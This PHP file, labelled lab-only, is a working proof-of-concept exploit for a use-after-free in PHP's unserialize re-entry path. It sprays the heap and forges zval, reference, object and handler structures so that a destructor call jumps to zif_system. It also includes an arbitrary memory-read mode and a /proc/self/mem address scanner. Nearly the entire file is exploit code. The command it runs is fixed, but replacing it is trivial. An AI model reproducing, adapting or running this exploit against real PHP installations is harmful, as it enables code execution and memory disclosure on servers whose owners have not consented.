<?php
/**
 * php2shell LAB-ONLY — var_destroy re-entry UAF terminal-call harness.
 *
 * Not a plugin. Models the two conditions the patch-gap needs:
 *   1. a sink reaches unserialize() with attacker bytes;
 *   2. a loaded class's __destruct() does a same-size spray and re-enters
 *      unserialize() — here with an out-of-range reference ("R:1020;")
 *      that resolves into the already-freed var_entries extension chunk.
 *
 * The reclaimed chunk's data[1] slot is a zval*; the spray's first 8 bytes
 * are that pointer. It points at a forged zval in a "carrier" string that
 * lives for the whole request. The forged zval is IS_REFERENCE -> a forged
 * zend_reference (refcount 0) whose value is IS_OBJECT -> a forged
 * zend_object/zend_execute_data whose handlers->dtor_obj is zif_system.
 *
 * Holding one reference and dropping it runs zend_reference_destroy ->
 * i_zval_ptr_dtor(fake object) -> zend_objects_store_del -> dtor_obj ==
 * zif_system(fake execute_data) — the fixed benign command below.
 *
 * Request: GET /vd.php?d=<base64 64-byte control blob>
 *   blob[0]     0 = measure (fill carrier with magic, sleep), 1 = fire
 *   blob[1..8]  carrier data address (fire) / unused
 *   blob[9..16] zif_system runtime address (fire)
 *   blob[17..32] 16-byte magic for /proc measurement
 *
 * Lab-only; fixed benign command; no arbitrary-command surface.
 */

const CARRIER_LEN = 0x1000;
const OFF_ZVAL = 0x100;   // forged zval (IS_REFERENCE -> OFF_REF)
const OFF_REF  = 0x200;   // forged zend_reference (val = IS_OBJECT -> OFF_OBJ)
const OFF_OBJ  = 0x300;   // forged zend_object == zend_execute_data
const OFF_HT   = 0x400;   // forged zend_object_handlers
const OFF_STR  = 0x500;   // forged zend_string + command
const CMD      = "id>/tmp/vd 2>&1";

const IS_STRING       = 6;
const IS_OBJECT       = 8;
const IS_REFERENCE    = 10;
const GC_REFERENCE    = 26;          // IS_REFERENCE | (1<<4)
const IS_TYPE_REFCOUNTED = 1;
const ZVAL_FLAG_SHIFT = 8;
const ZEND_CALL_ARG1_OFF = 80;       // ZEND_CALL_FRAME_SLOT(5) * 16

@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
while (ob_get_level() > 0) { @ob_end_flush(); }

$raw = base64_decode($_GET['d'] ?? '', true);
if ($raw === false || strlen($raw) < 33) {
    http_response_code(400);
    exit("bad blob\n");
}
$mode    = ord($raw[0]);
$addr    = unpack('P', substr($raw, 1, 8))[1];
$zif     = unpack('P', substr($raw, 9, 8))[1];
$magic   = substr($raw, 17, 16);
$GLOBALS['MODE'] = $mode;
$GLOBALS['LEAK_TARGET'] = $zif;
$GLOBALS['LEAK_LEN'] = 0x40000;

/* one fixed-size allocation; patch in place so the address is stable */
$carrier = str_repeat("\x00", CARRIER_LEN);

function p8(string &$s, int $off, int $val): void {
    $packed = pack('P', $val);
    for ($i = 0; $i < 8; $i++) { $s[$off + $i] = $packed[$i]; }
}
function p4(string &$s, int $off, int $val): void {
    $packed = pack('V', $val & 0xFFFFFFFF);
    for ($i = 0; $i < 4; $i++) { $s[$off + $i] = $packed[$i]; }
}
function pn(string &$s, int $off, string $bytes): void {
    for ($i = 0, $n = strlen($bytes); $i < $n; $i++) { $s[$off + $i] = $bytes[$i]; }
}

/* Find a 32-byte marker in this process's anonymous rw mappings, verifying
 * that it sits inside a zend_string of CARRIER_LEN (so the scanner's own
 * needle copy never matches).  Lab oracle: /proc/self/mem. */
function self_scan_pair(string $m16): int {
    $needle = $m16 . $m16;
    $nlen = strlen($needle);
    $pid = getmypid();
    $maps = @file("/proc/$pid/maps");
    if (!$maps) return 0;
    $fh = @fopen("/proc/$pid/mem", "rb");
    if (!$fh) return 0;
    foreach ($maps as $line) {
        if (!preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+(....)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$/', $line, $m)) continue;
        if ($m[3][0] !== 'r') continue;
        $path = trim($m[5]);
        if ($path !== '' && $path !== '[heap]') continue;
        $start = hexdec($m[1]); $end = hexdec($m[2]);
        $len = $end - $start;
        if ($len <= 0 || $len > 512 * 1024 * 1024) continue;
        if (@fseek($fh, $start) !== 0) continue;
        $off = 0; $carry = ''; $overlap = $nlen - 1;
        while ($off < $len) {
            $n = min(1 << 20, $len - $off);
            $buf = @fread($fh, $n);
            if ($buf === false || $buf === '') break;
            $hay = $carry . $buf;
            $from = 0;
            while (($p = strpos($hay, $needle, $from)) !== false) {
                if ($p >= 8) {
                    /* the carrier has zero padding immediately before the
                     * marker; the scanner's own needle string has its length
                     * (32) there, so this rejects the false positive */
                    $prev = unpack('P', substr($hay, $p - 8, 8))[1];
                    if ($prev === 0) {
                        $abs = $start + $off - strlen($carry) + $p;
                        fclose($fh);
                        return $abs;
                    }
                }
                $from = $p + 1;
            }
            $carry = $overlap > 0 ? substr($hay, -$overlap) : '';
            $off += strlen($buf);
        }
    }
    fclose($fh);
    return 0;
}

if ($mode === 0) {
    /* measurement mode: repeat the magic so /proc can find the data address */
    for ($o = 0; $o < CARRIER_LEN; $o += 16) { pn($carrier, $o, $magic); }
    $GLOBALS['carrier'] = $carrier;
    echo "measure sleep\n";
    if (function_exists('fastcgi_finish_request')) { fastcgi_finish_request(); }
    sleep(20);
    exit;
}

/* mode 5: latched fire — the request sleeps while the host scans and writes
 * the carrier address to /out/vd_addr, then the fire structures below use it */
if ($mode === 5 && $addr === 0) {
    pn($carrier, 0x800, $magic);
    pn($carrier, 0x810, $magic);
    @unlink('/out/vd_addr');
    echo "READY\n";
    @flush();
    $deadline = time() + 20;
    while (time() < $deadline) {
        if (is_file('/out/vd_addr')) {
            $h = trim(@file_get_contents('/out/vd_addr'));
            if ($h !== '') { $addr = @hexdec($h); break; }
        }
        usleep(100000);
    }
    if ($addr === 0) { http_response_code(500); echo "locate failed\n"; exit; }
}

/* ---- fire mode ---- */
$fake_zval = $addr + OFF_ZVAL;
$fake_ref  = $addr + OFF_REF;
$fake_obj  = $addr + OFF_OBJ;
$fake_ht   = $addr + OFF_HT;
$fake_str  = $addr + OFF_STR;

/* forged zval: IS_REFERENCE -> fake_ref */
p8($carrier, OFF_ZVAL + 0, $fake_ref);
p4($carrier, OFF_ZVAL + 8, IS_REFERENCE | (IS_TYPE_REFCOUNTED << ZVAL_FLAG_SHIFT));
p4($carrier, OFF_ZVAL + 12, 0);

/* forged zend_reference: refcount 0 (one copy will be held by $r), val = object */
p4($carrier, OFF_REF + 0, 0);                    // gc.refcount = 0
p4($carrier, OFF_REF + 4, GC_REFERENCE);          // gc.type_info
p8($carrier, OFF_REF + 8, $fake_obj);             // val.value.obj
p4($carrier, OFF_REF + 16, IS_OBJECT | (IS_TYPE_REFCOUNTED << ZVAL_FLAG_SHIFT));
p4($carrier, OFF_REF + 20, 0);
p8($carrier, OFF_REF + 24, 0);                    // sources

/* forged zend_object (doubles as zend_execute_data) */
p4($carrier, OFF_OBJ + 0, 1);                     // gc.refcount = 1
p4($carrier, OFF_OBJ + 4, IS_OBJECT);             // gc.type_info
p4($carrier, OFF_OBJ + 8, 0);                     // handle
p8($carrier, OFF_OBJ + 16, 0);                    // ce (short-circuited)
p8($carrier, OFF_OBJ + 24, $fake_ht);             // handlers / func
p8($carrier, OFF_OBJ + 32, 0);                    // properties / This.value
p4($carrier, OFF_OBJ + 40, 0);                    // This.u1
p4($carrier, OFF_OBJ + 44, 1);                    // This.u2.num_args = 1
p8($carrier, OFF_OBJ + 48, 0);                    // prev_execute_data
p8($carrier, OFF_OBJ + 56, 0);                    // symbol_table
p8($carrier, OFF_OBJ + 64, 0);                    // run_time_cache
p8($carrier, OFF_OBJ + 72, 0);                    // extra_named_params
p8($carrier, OFF_OBJ + ZEND_CALL_ARG1_OFF + 0, $fake_str);
p4($carrier, OFF_OBJ + ZEND_CALL_ARG1_OFF + 8, IS_STRING);
p4($carrier, OFF_OBJ + ZEND_CALL_ARG1_OFF + 12, 0);

/* forged handlers: dtor_obj = zif_system, free_obj = NULL */
p4($carrier, OFF_HT + 0, 0);                      // offset
p8($carrier, OFF_HT + 8, 0);                      // free_obj
p8($carrier, OFF_HT + 16, $zif);                  // dtor_obj

/* forged zend_string: "id>/out/vd 2>&1" */
p4($carrier, OFF_STR + 0, 0xFFFFFFFF);            // refcount
p4($carrier, OFF_STR + 4, IS_STRING);             // type_info
p8($carrier, OFF_STR + 8, 0);                     // h
p8($carrier, OFF_STR + 16, strlen(CMD));          // len
pn($carrier, OFF_STR + 24, CMD);

/* unused page: magic twice (32 B) for exact-layout /proc calibration;
 * the doubled pattern exists only in the carrier, never in the query/script */
pn($carrier, 0x800, $magic . $magic);

$GLOBALS['carrier']      = $carrier;
$GLOBALS['FAKE_ZVAL']    = $fake_zval;

if ($mode === 2) {
    /* exact-layout calibration: same allocations as fire, then sleep */
    echo "fire-layout sleep\n";
    if (function_exists('fastcgi_finish_request')) { fastcgi_finish_request(); }
    sleep(20);
    exit;
}

if ($mode === 3 || $mode === 4) {
    /* R3-L1: arbitrary-read / reflection proof.
     * data[1] -> zval(IS_STRING) -> forged zend_string at OFF_STR whose
     * val = LEAK_TARGET, len = 8.  The destructor echoes the bytes.
     * mode 4: the request sleeps while the host scans /proc and writes the
     * carrier address to /out/vd_addr, then patches in place and fires. */
    pn($carrier, 0x800, $magic);
    pn($carrier, 0x810, $magic);
    if ($addr === 0) {
        if ($mode === 4) {
            @unlink('/out/vd_addr');
            echo "READY\n";
            @flush();
            $deadline = time() + 20;
            while (time() < $deadline) {
                if (is_file('/out/vd_addr')) {
                    $h = trim(@file_get_contents('/out/vd_addr'));
                    if ($h !== '') { $addr = @hexdec($h); break; }
                }
                usleep(100000);
            }
        } else {
            $found = self_scan_pair($magic);
            if ($found !== 0) { $addr = $found - 0x800; }
        }
        if ($addr === 0) {
            http_response_code(500);
            echo "locate failed\n";
            exit;
        }
    }
    if ($GLOBALS['LEAK_TARGET'] === 0) {
        $GLOBALS['LEAK_TARGET'] = $addr + OFF_ZVAL;   // read the fake zval itself
    }
    $fake_zval = $addr + OFF_ZVAL;
    $fake_str  = $addr + OFF_STR;
    p8($carrier, OFF_ZVAL + 0, $fake_str);
    p4($carrier, OFF_ZVAL + 8, IS_STRING | (IS_TYPE_REFCOUNTED << ZVAL_FLAG_SHIFT));
    p4($carrier, OFF_ZVAL + 12, 0);
    p4($carrier, OFF_STR + 0, 0x40000000);   // no addref overflow
    p4($carrier, OFF_STR + 4, IS_STRING);
    p8($carrier, OFF_STR + 8, 0);
    p8($carrier, OFF_STR + 16, $GLOBALS['LEAK_LEN']);
    p8($carrier, OFF_STR + 24, $GLOBALS['LEAK_TARGET']);
    $GLOBALS['carrier'] = $carrier;
    $GLOBALS['FAKE_ZVAL'] = $fake_zval;
    $GLOBALS['CARRIER_ADDR'] = $addr;
    @file_put_contents('/tmp/vd_stage',
        "addr=0x" . dechex($addr) . " fake_str=0x" . dechex($fake_str)
        . " target=0x" . dechex($GLOBALS['LEAK_TARGET'])
        . " zval0=" . bin2hex(substr($carrier, OFF_ZVAL, 8))
        . " str24=" . bin2hex(substr($carrier, OFF_STR + 24, 8)) . "\n",
        FILE_APPEND);
    class RT {
        public function __destruct() {
            $zv = $GLOBALS['FAKE_ZVAL'];
            $spray = [];
            for ($i = 0; $i < 64; $i++) {
                $s = str_repeat("\x41", 8135);
                $q = pack('P', $zv);
                for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
                $spray[] = $s;
            }
            @file_put_contents('/tmp/vd_stage', "enter\n", FILE_APPEND);
            $r = @unserialize('R:1020;');
            @file_put_contents('/tmp/vd_stage', "parsed\n", FILE_APPEND);
            $out = "CARRIER:" . dechex($GLOBALS['CARRIER_ADDR']) . "\n";
            if (is_string($r)) {
                $out .= "LEAK:" . bin2hex($r) . "\n";
            } else {
                $out .= "LEAK-TYPE:" . gettype($r) . "\n";
            }
            /* the outer var_destroy double-frees the reclaimed chunk after
             * this destructor returns — persist + flush before that abort */
            @file_put_contents('/tmp/vd_leak', $out);
            echo $out;
            @flush();
            if (function_exists('fastcgi_finish_request')) { fastcgi_finish_request(); }
            unset($r, $spray);
        }
    }
    $N = 1016;
    $p = 'a:' . ($N + 2) . ':{';
    for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
    $p .= 'i:99999;O:2:"RT":0:{}i:99999;i:42;}';
    @unserialize($p);
    echo "vd-read done\n";
    exit;
}

class T {
    public function __destruct() {
        $zv = $GLOBALS['FAKE_ZVAL'];
        $spray = [];
        for ($i = 0; $i < 64; $i++) {
            /* one 8160 B allocation per string, pointer patched in place;
             * a concatenated filler would be a same-size intermediate that
             * steals the freed var_entries chunk first. */
            $s = str_repeat("\x41", 8135);
            $q = pack('P', $zv);
            for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
            $spray[] = $s;
        }
        error_log("[VD] spray done, parsing R:1020");
        $r = @unserialize('R:1020;');
        error_log("[VD] after parse: " . gettype($r));
        unset($r);                     // drop the reference -> dtor chain
        error_log("[VD] after unset");
        unset($spray);
    }
}

$GLOBALS['carrier'] = $carrier;        // keep the forged blob alive

$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
$p .= 'i:99999;O:1:"T":0:{}i:99999;i:42;}';
@unserialize($p);

echo "vd done\n";
